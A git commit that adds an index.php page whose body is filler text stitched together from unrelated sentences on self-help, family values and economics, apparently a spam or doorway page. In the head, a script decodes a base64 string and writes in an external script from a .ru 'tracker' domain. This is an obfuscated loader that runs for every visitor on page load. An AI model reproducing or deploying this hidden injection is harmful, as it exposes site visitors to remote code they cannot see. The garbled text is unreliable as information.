74cc9b4a9ba08df849edb5fe190c5a9dc4b76d93
tmnpryfa <78704115+tmnpryfa@users.noreply.github.com>
2021-02-07 22:43:22 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>3.Development of a research plan.  I was afraid that if I did not control </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl95ZHM3NGxlOTM2MXZxcWxrZTgiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="303v9fl5z15oq6gwl">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="o2lywqfpx9jdrlq01pz">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>3.Development of a research plan.  I was afraid that if I did not control </h1>
+	</section>
+
+
+	<section class="our-work" class="u8hgtjiyihtf0rxd">
+		<h3 class="title">If so, you can instruct employees to conduct a thor</h3>
+		<p>We are able to write the Statement of Personal Mission, a personal constitution.  One of the main problems that hinders people in their pursuit of greater efficiency is that they do not think broadly enough.  You can also go for “Lose / Win” if you see that it will take such an investment of time and effort to win that more significant values ​​will suffer.  And this is subtle and imperceptible, but it very strongly affects us.  When you feel that I see the situation correctly, we will assess to what extent my proposals suit you.  In the mid-1990s.  Irretrievable costs have a distinctive feature that allows them to be distinguished from other costs.  But suddenly the thought came to him that all these motives were not good enough and that perhapsthis is where the reason for his current depression lies.  Considering the forms of inflation in an enlarged form, we can distinguish two: obvious inflation, which manifests itself in an open rise in prices, and latent, indirect.  Animals do not have this ability.  The rise in military spending is one of the causes of chronic budget deficits and an increase in public debt in many countries, for which the government increases the money supply. </p>
+		<hr>
+
+		<ul class="grid" class="6ig3cxfxcpauke3">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="303v9fl5z15oq6gwl">
+		<h3 class="title">They filter everything through their parad</h3>
+		<p>As you develop a family mission statement, you formulate its fundamental foundations.This Mission becomes the constitution of the family, the norm, the criterion for making judgments and decisions.  - Well no,I'm pretty sure he got it right! “And you’ll give her medicine without being absolutely sure that the doctor knows her age?” Sandra fell silent.  Interdependent people combine their efforts with the efforts of others to achieve the highest possible success.  The monopoly price structure is expressed by the formula:Rmon.  In an attempt to compensate for my lack of influence, I took power from my father's position and authority and forced my daughter to do what I wanted her to do.  If your center is a church, your decision may depend on whether other parishioners are planning to go to the concert, or whether a member of the parish is working in your firm, or what kind of concert is expected: Handel's "Messiah" has higher priority than rock music.  The latter is defined as the dominant position of the entrepreneur,which gives him the opportunity, alone or together with other entrepreneurs, to limit competition in the market for a particular product.  This is due to the fact that agriculture has been the leading sector of the economy for a long period of time.  At that time, the state of the project was sad.Streets began to overgrow with weeds and turn into wastelands, and the owners of several built houses, finding that the value of their properties had fallen, prepared for a fight.  Every time I go somewhere, she gives me a third-degree interrogation. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="o2lywqfpx9jdrlq01pz" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="u8hgtjiyihtf0rxd">
+		<h3 class="title">One department store chain, thanks to this paradigm, has gained</h3>
+		<p>Having studied this amazing area over the years, I personally tend to believe that the best idea in the field of time management can be conveyed in one phrase: "Organization and action based on priorities." This phrase reflects the evolution of three generations of time management theory.  As you can see from the matrix, activities are determined by two factors:urgent and important.  My money will serve me, not dominate me.  A new joint vision began to form.  Frankl became an inspiring example for everyone around him, even for some of the guards.  The stimulating subfunction of taxes is implemented through a system of benefits, exceptions, preferences, linked by the preferential features of the object of taxation.  First principle.  - To Bob Teale for his help in organizing our company in such a way that I was able to fully focus on the work on the book.“To David Conley, for educating hundreds of organizations on the value and power of The Seven Habits, allowing my colleagues Blaine Lee, Royce Kruger, Roger Merrill, Ell Sweitzler and myself to continually bring our message to a wide variety of audiences. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="6ig3cxfxcpauke3" style="background-image: url(image3.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="303v9fl5z15oq6gwl">
+		<h3 class="title">Take your time.  Calling FAM Given the nature of yo</h3>
+		<p>- Now come on.  Social recognition of labor is possible only through exchange, thus: the social character of labor is hidden, i.e.  Character.  However, before you can understand these seven skills, you need to understand our own "paradigms" and how the "paradigm shift" is implemented. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="o2lywqfpx9jdrlq01pz" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="u8hgtjiyihtf0rxd">
+		<h3 class="title">Eliot, which perfectly reflect my discover</h3>
+		<p>- the good memory of my father.  Make the most of your senses.  The latter option is most often carried out in the form of a price war - a gradual decrease in the existing price level in order to oust competitors from the oligopolistic market.  Only after that did he go to blow off the glass.  We act in the spirit of the Alcoholics Anonymous prayer: "God, give me the courage to change what I can and must change, humility to accept what cannot be changed, and wisdom to distinguish one from the other." Whatever category the problem belongs to, it is within our power to take the first step towards solving it.  Using both hemispheres of the brain Self-awareness gives us the ability to analyze our own thoughts.  You are attuned to the perception of information coming from the depths of the soul of another person.  - Wonderful! Do you do what you want to doAnd then he began to literally interrogate her.  You may receive, as golden eggs, temporary satisfaction from discrediting someone or giving out information that is not intended for everyone, but at the same time you will choke a goose, undermine a relationship that could bring you a lot of joy in the future.  Such communication is ineffective, since it lacks the P / PC balance and it gives rise to new reasons for going into a deep defense.  Competition, competition has a place in the market.  - Education is an important thing.  While they may verbally express their joy at the success of others, in reality they would love to eat them for dinner. </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="6ig3cxfxcpauke3" class="title">This is called barter.  For several years I have worked with a </h3>	
+		<p>Serious people need the gist, they need the process.  They put pressure on us, demand action.  From the very center In order to draw up the positions of personal mission, we must start from the very center of our Circle of Influence, where our main paradigms are concentrated - those prisms through which we see the world around us.  If we have withdrawn from an Emotional Bank Account, we must apologize and do so sincerely.  I realized that Sandra was not talking about electrical appliances; she spoke of her father and of her loyalty - of loyalty to his memory.  I will boldly defend my beliefs, but I will not take yours into account.  The concept of "production" in the ordinary state is associated with the manufacturing process, the creation of certain material goods, but in the economy it has a broader content.  I can be ineffective in my interactions with my co-workers, wife and children, because I constantly tell them about my point of view, and I never listen to them.  If your parents scolded you as a child, that doesn't mean you should scold your own child.  This was extremely outrageous.  Raw materials, energy, hourly wages are examples of variable costs for most firms.  I tried to devote ten minutes of "my precious time" to a child or subordinate to solve a problem, but I found that such "productivity" only creates new problems and rarely eliminates serious worries.  And then, seeing how his face tightened from the effort, how his blood vessels swelled, I thought: “Now the barbell will break out of his hands and break his chest.  Do you have everything you need? - Yes. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="303v9fl5z15oq6gwl">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="o2lywqfpx9jdrlq01pz"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="u8hgtjiyihtf0rxd"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="6ig3cxfxcpauke3"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>28313 Elenor Rapid, Apt. 211, 18337-8326, Port Nanniemouth, Montana, United States</p>
+		<p>Phone number: +763(55)703-68-87225</p>
+	</footer>
+
+</body>
+
+</html>
